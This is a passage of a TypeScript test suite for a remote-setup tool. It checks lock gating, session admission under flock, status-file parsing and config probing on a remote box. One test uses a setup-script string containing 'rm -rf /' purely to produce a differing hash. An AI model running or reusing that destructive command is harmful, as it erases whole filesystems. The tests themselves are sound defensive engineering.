    expect(decide("success", "free", true)).toBe("start");
  });

  it("refuses an in-progress attempt, and --force is what overrides a dead one", () => {
    expect(decide("in-progress", "free")).toBe("refuse");
    expect(decide("in-progress", "free", true)).toBe("start");
  });

  it("refuses everything while the lock is held, --force included", () => {
    for (const v of Object.keys(verdicts)) {
      expect(decide(v, "held")).toBe("refuse");
      expect(decide(v, "held", true)).toBe("refuse");
    }
  });

  /**
   * GPT Sol's Stage 2 finding 9. Every `noflock` cell used to START a job,
   * which then died with exit 78 inside a pane that vanished — a refusal
   * wearing a green tick. There is no lock to be had, and running without one
   * is the concurrency the design exists to prevent.
   */
  it("refuses every run when the box has no flock, including a forced one", () => {
    for (const v of Object.keys(verdicts)) {
      expect(decide(v, "noflock")).toBe("refuse");
      expect(decide(v, "noflock", true)).toBe("refuse");
    }
    const r = setupGateDecision(verdicts.success as SetupVerdict, "noflock", true);
    expect(r.kind === "refuse" && r.why).toContain("flock is not installed");
  });
});

describe("foundGateDecision", () => {
  it("lets a success through in silence", () => {
    expect(foundGateDecision(verdicts.success as SetupVerdict, "free")).toEqual({ kind: "go" });
  });

  it("warns and proceeds for never-run, failed and config-changed", () => {
    for (const v of ["never-run", "failed", "config-changed"]) {
      expect(foundGateDecision(verdicts[v] as SetupVerdict, "free").kind).toBe("warn");
    }
  });

  /**
   * GPT Sol's Stage 3 finding 1. This used to refuse `in-progress + held` and
   * NOTHING ELSE, so a `success` verdict walked past a lock that a setup was
   * holding — and that combination is not exotic: it is the window before a
   * running job has written its `started` status, and the window after it has
   * written its terminal one. In both, the tree is being rewritten while the
   * verdict is telling the truth about a different moment.
   */
  it("refuses EVERY verdict while the lock is held, success included", () => {
    for (const v of Object.keys(verdicts)) {
      const got = foundGateDecision(verdicts[v] as SetupVerdict, "held");
      expect(got.kind, `${v} + held was not refused`).toBe("refuse");
    }
    const got = foundGateDecision(verdicts.success as SetupVerdict, "held");
    expect(got.kind === "refuse" && got.why).toContain("RIGHT NOW");
    // Still a warn when nothing holds it: refusing a free lock would stop every
    // session in a repo that was set up by hand, which is `~/code/spideryarn2`.
    expect(foundGateDecision(verdicts["in-progress"] as SetupVerdict, "free").kind).toBe("warn");
  });

  /** No flock is no serialisation, so `free` is a guess and
   *  `sessionAdmissionScript` cannot run at all. The same refusal
   *  `setupGateDecision` makes. */
  it("refuses every verdict when the box has no flock", () => {
    for (const v of Object.keys(verdicts)) {
      expect(foundGateDecision(verdicts[v] as SetupVerdict, "noflock").kind, v).toBe("refuse");
    }
  });

  /**
   * Sol's Stage 3 finding 1 again, the other half: a status file that is there
   * and cannot be parsed used to print a yellow line and let the session start.
   * Something wrote that file. "I cannot read the evidence" is not evidence.
   */
  it("refuses when the status file could not be read or believed, whatever the lock says", () => {
    for (const lock of ["none", "free", "held", "noflock"] as const) {
      const got = foundGateDecision(verdicts.success as SetupVerdict, lock, "the status file is not JSON");
      expect(got.kind, `unreadable + ${lock}`).toBe("refuse");
      if (got.kind !== "refuse") continue;
      expect(got.why).toContain("not JSON");
    }
    // And the reason is only consulted when there IS one: an absent third
    // argument must not read as an unreadable file.
    expect(foundGateDecision(verdicts.success as SetupVerdict, "free").kind).toBe("go");
  });

  /** Sol's finding 7: a status about another tree is worse than no status,
   *  because it is evidence pointing somewhere else. */
  it("refuses a status that is about a different checkout", () => {
    const got = foundGateDecision(verdicts["wrong-checkout"] as SetupVerdict, "free");
    expect(got.kind).toBe("refuse");
    if (got.kind !== "refuse") return;
    expect(got.why).toContain("gjd-remote setup");
  });
});

// ------------------------------------------------------- admitting a session

/**
 * GPT Sol's Stage 3 finding 1, and the part `foundGateDecision` cannot do.
 *
 * The gate reads a status and decides; `tmux new-session` happens seconds
 * later. These run the script that closes that gap, for real, and the thing
 * every one of them turns on is whether the CALLER'S COMMAND RAN — proved by
 * the command creating a file, never by the word in the reply.
 */
describe("sessionAdmissionScript, run for real", () => {
  /** The command the admission runs, and the file that says it did. */
  function marker(): { command: string; path: string } {
    const path = join(root, "the-session-was-created");
    return { command: `printf 'created\\n' > ${path}`, path };
  }

  function admit(o: { expect: string | null; command: string; statusPath?: string; flock?: "grant" | "busy" }): string {
    return run(
      sessionAdmissionScript({
        lockPath: join(root, "locks", "setup-owner--name.lock"),
        locksDir: join(root, "locks"),
        statusPath: o.statusPath ?? join(root, "setup", "owner--name.json"),
        expect: o.expect,
        command: o.command,
      }),
      { path: fakeFlock(o.flock ?? "grant") },
    );
  }

  const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");

  function writeStatus(text: string): string {
    const p = join(root, "setup", "owner--name.json");
    mkdirSync(join(root, "setup"), { recursive: true });
    writeFileSync(p, text);
    return p;
  }

  it("runs the command when the status under the lock is the one the laptop saw", () => {
    const text = '{"v":1,"outcome":"success"}\n';
    writeStatus(text);
    const m = marker();
    const got = parseAdmission(admit({ expect: b64(text), command: m.command }));
    if (!got.ok) throw new Error(got.why);
    expect(got.admission).toEqual({ kind: "ran", code: 0 });
    expect(readFileSync(m.path, "utf8")).toBe("created\n");
  });

  it("runs the command when there was no status and there still is none", () => {
    const m = marker();
    const got = parseAdmission(admit({ expect: null, command: m.command }));
    expect(got.ok && got.admission.kind).toBe("ran");
    expect(existsSync(m.path)).toBe(true);
  });

  /**
   * The whole point: between the laptop's read and the lock, a setup finished
   * (or started, or failed) and rewrote the verdict. The decision the laptop
   * made was about a file that no longer exists, so nothing may run on it.
   */
  it("REFUSES, and runs nothing, when the status changed underneath", () => {
    writeStatus('{"v":1,"outcome":"failed"}\n');
    const m = marker();
    const got = parseAdmission(admit({ expect: b64('{"v":1,"outcome":"success"}\n'), command: m.command }));
    if (!got.ok) throw new Error(got.why);
    expect(got.admission.kind).toBe("changed");
    if (got.admission.kind !== "changed") return;
    // And it hands back what it now says, so the caller can print it rather
    // than telling somebody to go and look.
    expect(got.admission.status).toBe('{"v":1,"outcome":"failed"}\n');
    expect(existsSync(m.path), "the session was created against a status nobody read").toBe(false);
  });

  it("REFUSES, and runs nothing, when a status appeared where there was none", () => {
    writeStatus('{"v":1,"outcome":"started"}\n');
    const m = marker();
    const got = parseAdmission(admit({ expect: null, command: m.command }));
    expect(got.ok && got.admission.kind).toBe("changed");
    expect(existsSync(m.path)).toBe(false);
  });

  it("REFUSES, and runs nothing, when the status vanished", () => {
    const m = marker();
    const got = parseAdmission(admit({ expect: b64('{"v":1,"outcome":"success"}\n'), command: m.command }));
    if (!got.ok) throw new Error(got.why);
    expect(got.admission).toEqual({ kind: "changed", status: undefined });
    expect(existsSync(m.path)).toBe(false);
  });

  /** A setup for this repo holds the lock, so the tree is being rewritten right
   *  now — whatever the status file happens to say at this instant. */
  it("REFUSES, and runs nothing, while a setup holds the lock", () => {
    const text = '{"v":1,"outcome":"success"}\n';
    writeStatus(text);
    const m = marker();
    const got = parseAdmission(admit({ expect: b64(text), command: m.command, flock: "busy" }));
    if (!got.ok) throw new Error(got.why);
    expect(got.admission).toEqual({ kind: "held" });
    expect(existsSync(m.path), "a session was started in a tree a setup is rewriting").toBe(false);
  });

  it("carries the command's own exit code back", () => {
    writeStatus("x\n");
    const got = parseAdmission(admit({ expect: b64("x\n"), command: "exit 42" }));
    expect(got.ok && got.admission).toEqual({ kind: "ran", code: 42 });
  });

  /**
   * `tmux new-session` may START the tmux server, and a server that inherited
   * fd 9 would hold the setup lock until the box is rebooted — the same
   * open-file-description trap as the setup job's `run_step`, with a daemon on
   * the end of it. So the command is given no fd 9 at all, and it is asked.
   */
  it("gives the command no copy of the lock descriptor", () => {
    writeStatus("x\n");
    const path = join(root, "fd9");
    const got = parseAdmission(
      admit({ expect: b64("x\n"), command: `if [ -e /dev/fd/9 ]; then printf o%s > ${path}; else printf c%s > ${path}; fi` }),
    );
    expect(got.ok && got.admission.kind).toBe("ran");
    expect(readFileSync(path, "utf8")).toBe("c");
  });

  /** The reply is a wire format, and the command's own chatter must not be in
   *  it — a `tmux` that printed a line would otherwise be a field nobody asked
   *  for, and the parser would refuse a session that was created. */
  it("keeps the command's output out of the reply", () => {
    writeStatus("x\n");
    const got = parseAdmission(admit({ expect: b64("x\n"), command: "echo step surprise" }));
    expect(got.ok && got.admission.kind).toBe("ran");
  });

  it("refuses a command it cannot embed safely", () => {
    const base = { lockPath: "/l", locksDir: "/L", statusPath: "/s", expect: null };
    expect(() => sessionAdmissionScript({ ...base, command: "a\nb" })).toThrow(/one line/);
    expect(() => sessionAdmissionScript({ ...base, command: "  " })).toThrow(/empty/);
    expect(() => sessionAdmissionScript({ ...base, command: "a\u001b[2Kb" })).toThrow(/control character/);
    expect(() => sessionAdmissionScript({ ...base, command: "true", expect: "not base64!" })).toThrow(/base64/);
  });
});

describe("parseAdmission", () => {
  const reply = (o: { admit: string; state: string; text: string; code: string }) =>
    [BOX_OK, `admit ${o.admit}`, `state ${o.state}`, `text ${o.text}`, `code ${o.code}`, BOX_END].join("\n");

  it("refuses a reply cut short, and says nothing about whether the session exists", () => {
    const got = parseAdmission([BOX_OK, "admit ran", "state present"].join("\n"));
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.refused).toBe(false);
  });

  it("hands back the box's own refusal as one", () => {
    const got = parseAdmission(`${BOX_ERR} flock is not on this box, so a session cannot be admitted safely\n`);
    expect(got.ok === false && got.refused).toBe(true);
  });

  it("refuses a held lock that also claims to have read something", () => {
    expect(parseAdmission(reply({ admit: "held", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
  });

  it("refuses a 'ran' with no exit code, rather than assuming zero", () => {
    expect(parseAdmission(reply({ admit: "ran", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
    expect(parseAdmission(reply({ admit: "ran", state: "present", text: "eA==", code: "no" })).ok).toBe(false);
  });

  it("refuses a 'changed' that reports an exit code, because nothing ran", () => {
    expect(parseAdmission(reply({ admit: "changed", state: "present", text: "eA==", code: "0" })).ok).toBe(false);
  });

  it("refuses a word it does not know, and a status that contradicts itself", () => {
    expect(parseAdmission(reply({ admit: "maybe", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
    expect(parseAdmission(reply({ admit: "changed", state: "nonsense", text: "-", code: "-" })).ok).toBe(false);
    expect(parseAdmission(reply({ admit: "changed", state: "absent", text: "eA==", code: "-" })).ok).toBe(false);
  });

  it("refuses text that did not survive the trip", () => {
    const cut = Buffer.from("a reasonably long status here", "utf8").toString("base64").slice(0, -6);
    expect(parseAdmission(reply({ admit: "changed", state: "present", text: cut, code: "-" })).ok).toBe(false);
  });
});

// ------------------------------------------- the lock, the status, the inode

/**
 * GPT Sol's Stage 3 finding 7f. The `LockState` matrix injects the four states
 * directly and so says nothing about the producer — a probe that never looked
 * for `flock` at all would satisfy every one of those rows. The one arrangement
 * where the two orders differ is a box with NO `flock` and a lock file present:
 * probing the file first answers `free`, which is a sentence about a lock that
 * cannot exist. So the script is run with `flock` genuinely off the PATH.
 *
 * The two `noflock` cases can only run where there is no real `flock` to hide.
 * The script extends its own PATH with the standard directories on purpose, so
 * that an ssh with a thin environment still finds its tools, and there is no
 * honest way to take `/usr/bin/flock` away from it. That is this Mac; on the
 * box and on Linux CI they skip, exactly as the job script's own `noflock` test
 * does in tests/gjd-remote-setup.test.ts. The other four rows run everywhere.
 */
const FLOCK_ON_STANDARD_PATHS =
  execFileSync("bash", ["--norc", "--noprofile", "-c", "command -v flock >/dev/null 2>&1 && echo yes || echo no"], {
    encoding: "utf8",
    // --norc --noprofile, and a PATH of exactly the directories the script
    // appends to its own: a startup file that put a directory back on PATH
    // would make this answer the wrong question, quietly.
    env: { PATH: "/usr/local/bin:/usr/bin:/bin" },
  }).trim() === "yes";

describe("setupReadScript, run for real", () => {
  /** A PATH with nothing named `flock` on it: a shim directory of symlinks to
   *  the handful of tools the script uses. */
  function pathWithoutFlock(): string {
    const bin = join(root, "bin-no-flock");
    mkdirSync(bin, { recursive: true });
    for (const tool of ["bash", "base64", "ls", "awk", "tr", "cat", "sh"]) {
      const found = execFileSync("bash", ["-c", `command -v ${tool} || true`], { encoding: "utf8" }).trim();
      if (found !== "") symlinkSync(found, join(bin, tool));
    }
    return bin;
  }

  function read(o: { lockPath: string; statusPath: string; dir: string; path?: string; noFlock?: boolean }) {
    const script = setupReadScript({ statusPath: o.statusPath, lockPath: o.lockPath, dir: o.dir });
    // A bare PATH (no inherited entries) is the only way to make `flock` absent
    // on a box that has one; `run` prepends to process.env.PATH, so this goes
    // round it deliberately.
    const out = o.noFlock
      ? execFileSync("bash", ["--norc", "--noprofile", "-c", script], {
          encoding: "utf8",
          stdio: ["ignore", "pipe", "pipe"],
          env: { PATH: pathWithoutFlock() },
        })
      : run(script, o.path === undefined ? {} : { path: o.path });
    return parseBoxRead(out, ["lock", "inode", "status", "text"]);
  }

  const paths = () => ({
    lockPath: join(root, "locks", "setup-owner--name.lock"),
    statusPath: join(root, "setup", "owner--name.json"),
    dir: join(root, "code", "thing"),
  });

  it.skipIf(FLOCK_ON_STANDARD_PATHS)("says noflock — not none — when the box has no flock and a lock file is there", () => {
    const p = paths();
    mkdirSync(join(root, "locks"), { recursive: true });
    writeFileSync(p.lockPath, "");
    const got = read({ ...p, noFlock: true });
    if (!got.ok) throw new Error(got.why);
    expect(got.fields.get("lock")).toBe("noflock");
  });

  it.skipIf(FLOCK_ON_STANDARD_PATHS)("says noflock when the box has no flock and there is no lock file either", () => {
    // The arrangement the old order got RIGHT by accident is the one that
    // matters least; this is the same box, and the answer must not change.
    const got = read({ ...paths(), noFlock: true });
    expect(got.ok && got.fields.get("lock")).toBe("noflock");
  });

  it("says none when there is a flock and nothing has ever taken the lock", () => {
    const got = read({ ...paths(), path: fakeFlock("grant") });
    expect(got.ok && got.fields.get("lock")).toBe("none");
    // And LOOKING did not create it: "there is a lock file" is a fact worth
    // keeping true.
    expect(existsSync(paths().lockPath)).toBe(false);
  });

  it("tells a lock nobody holds from one somebody does", () => {
    const p = paths();
    mkdirSync(join(root, "locks"), { recursive: true });
    writeFileSync(p.lockPath, "");
    expect(read({ ...p, path: fakeFlock("grant") }).ok && read({ ...p, path: fakeFlock("grant") })).toBeTruthy();
    const free = read({ ...p, path: fakeFlock("grant") });
    expect(free.ok && free.fields.get("lock")).toBe("free");
    const held = read({ ...p, path: fakeFlock("busy") });
    expect(held.ok && held.fields.get("lock")).toBe("held");
  });

  it("carries the status file and the checkout's inode in the same trip", () => {
    const p = paths();
    const dir = makeRepo("code/thing", "https://github.com/gregdetre/gjdutils.git");
    mkdirSync(join(root, "setup"), { recursive: true });
    const text = '{"v":1,"outcome":"success"}\n';
    writeFileSync(p.statusPath, text);
    const got = read({ ...p, dir, path: fakeFlock("grant") });
    if (!got.ok) throw new Error(got.why);
    expect(got.fields.get("status")).toBe("present");
    const b64 = got.fields.get("text") ?? "";
    // Not `base64 -w0`, which is GNU-only: the version of this script that
    // lived in gjd-remote.ts used it, and would have come back empty here.
    expect(decodeBoxField(b64, "the status").ok && decodeBoxField(b64, "the status")).toEqual({ ok: true, text });
    expect(got.fields.get("inode")).toMatch(/^[0-9]+$/);
  });

  it("says absent, and no inode, for a repo nothing has set up in a directory that is not a checkout", () => {
    const p = paths();
    mkdirSync(p.dir, { recursive: true });
    const got = read({ ...p, path: fakeFlock("grant") });
    if (!got.ok) throw new Error(got.why);
    expect(got.fields.get("status")).toBe("absent");
    expect(got.fields.get("text")).toBe("-");
    expect(got.fields.get("inode")).toBe("-");
  });
});

// --------------------------------------------------------------- the log's end

describe("needsTerminalSetupRecord", () => {
  const started = { cmd: "setup", attempt: "a1", outcome: "started" };

  it("owes a record when only a start was written", () => {
    expect(needsTerminalSetupRecord([started], "a1")).toBe(true);
  });

  it("owes nothing once the outcome is in", () => {
    expect(needsTerminalSetupRecord([started, { cmd: "setup", attempt: "a1", outcome: "success" }], "a1")).toBe(false);
    expect(needsTerminalSetupRecord([started, { cmd: "setup", attempt: "a1", outcome: "failed" }], "a1")).toBe(false);
  });

  it("owes nothing for an attempt this laptop never started", () => {
    expect(needsTerminalSetupRecord([started], "a2")).toBe(false);
    expect(needsTerminalSetupRecord([], "a1")).toBe(false);
  });

  it("ignores records of other commands that happen to carry an attempt", () => {
    expect(needsTerminalSetupRecord([{ cmd: "new-shell", attempt: "a1", outcome: "started" }], "a1")).toBe(false);
  });
});

// A spec is a plain object; this keeps the type imported and asserts the shape
// the CLI depends on when it prints one.
const _shape: SetupSpec = {
  setup: null,
  source: "none",
  check: null,
  warnings: [],
  scriptSha256: null,
  packageSetup: null,
};
void _shape;

// ------------------------------------------------- a repo's config, on the box

describe("boxConfigScript, run for real", () => {
  const CONFIG_DIR = ".gjd-remote";
  const CONFIG_FILE = ".gjd-remote/config.toml";
  const SETUP_SCRIPT = ".gjd-remote/setup";

  const probe = (dir: string) =>
    parseBoxConfig(
      run(boxConfigScript({ dir, configDir: CONFIG_DIR, configFile: CONFIG_FILE, setupScript: SETUP_SCRIPT })),
      dir,
    );

  function checkout(where: string, files: Record<string, string>, exec: string[] = []): string {
    const dir = join(root, where);
    mkdirSync(join(dir, CONFIG_DIR), { recursive: true });
    for (const [name, body] of Object.entries(files)) writeFileSync(join(dir, name), body);
    for (const name of exec) chmodSync(join(dir, name), 0o755);
    return dir;
  }

  it("reads a config, an executable setup script and its hash", () => {
    const body = "#!/bin/sh\nnpm ci\n";
    const dir = checkout("repo", { [CONFIG_FILE]: 'setup = "./x"\n', [SETUP_SCRIPT]: body }, [SETUP_SCRIPT]);
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.setupScript).toBe("executable");
    expect(got.fields.scriptSha256).toBe(sha256(body));
    expect(got.fields.configText).toBe('setup = "./x"\n');
    expect(got.fields.packageJsonHasSetup).toBe(false);
    expect(got.fields.packageSetup).toBeNull();
  });

  it("notices a setup script that is not executable", () => {
    const dir = checkout("repo", { [SETUP_SCRIPT]: "#!/bin/sh\n" });
    expect(probe(dir).ok && probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.setupScript).toBe("not-executable");
  });

  it("carries package.json's setup body, not just the fact of it", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ scripts: { setup: "node scripts/setup.js" } }) });
    const got = probe(dir);
    expect(got.ok && got.fields.packageJsonHasSetup).toBe(true);
    expect(got.ok && got.fields.packageSetup).toBe("node scripts/setup.js");
  });

  /**
   * The bug this protocol had when it lived in `gjd-remote.ts`, where nothing
   * could reach it: the probe printed the base64 of the setup script's body,
   * and "there is no setup script" and "the probe failed" were both the empty
   * string — so an ordinary `package.json` came back as unparseable and every
   * `gjd-remote setup` in that repo refused.
   */
  it("says a package.json with no setup script has none, rather than failing to read it", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ name: "x", scripts: { test: "vitest" } }) });
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.packageJsonHasSetup).toBe(false);
    expect(got.fields.packageSetup).toBeNull();
  });

  it("says a package.json with no scripts at all has none", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ name: "x" }) });
    expect(probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.packageJsonHasSetup).toBe(false);
  });

  it("refuses a package.json it cannot parse, rather than calling it setup-less", () => {
    const dir = checkout("repo", { "package.json": "{ not json" });
    const got = probe(dir);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("not valid JSON");
  });

  it("refuses a directory it cannot enter", () => {
    const got = probe(join(root, "nope"));
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("cannot enter");
  });

  it("refuses a .gjd-remote that is a file", () => {
    const dir = join(root, "odd");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, CONFIG_DIR), "not a directory\n");
    const got = probe(dir);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("not a directory");
  });

  it("carries a config with a newline and a quote in it, intact", () => {
    const toml = 'setup = "echo \'one\' && echo two"\n# a comment\n';
    const dir = checkout("repo", { [CONFIG_FILE]: toml });
    expect(probe(dir).ok && probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.configText).toBe(toml);
  });

  /** The whole point of the specification: what the box says and what the
   *  laptop says are compared field by field, and this is the box's half. */
  it("feeds a specification that differs from the laptop's only where the files do", () => {
    const dir = checkout("repo", { [SETUP_SCRIPT]: "#!/bin/sh\nnpm ci\n" }, [SETUP_SCRIPT]);
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    const boxSpec = setupSpec(
      parseRepoConfig(got.fields.configText, {
        setupScript: got.fields.setupScript,
        packageJsonHasSetup: got.fields.packageJsonHasSetup,
      }),
      { scriptSha256: got.fields.scriptSha256, packageSetup: got.fields.packageSetup },
    );
    const laptopSame = setupSpec(parseRepoConfig("", { setupScript: "executable", packageJsonHasSetup: false }), {
      scriptSha256: sha256("#!/bin/sh\nnpm ci\n"),
      packageSetup: null,
    });
    expect(diffSetupSpec(boxSpec, laptopSame)).toEqual([]);
    const laptopOther = setupSpec(parseRepoConfig("", { setupScript: "executable", packageJsonHasSetup: false }), {
      scriptSha256: sha256("#!/bin/sh\nrm -rf /\n"),
      packageSetup: null,
    });
    expect(diffSetupSpec(boxSpec, laptopOther)).toHaveLength(1);
  });
});
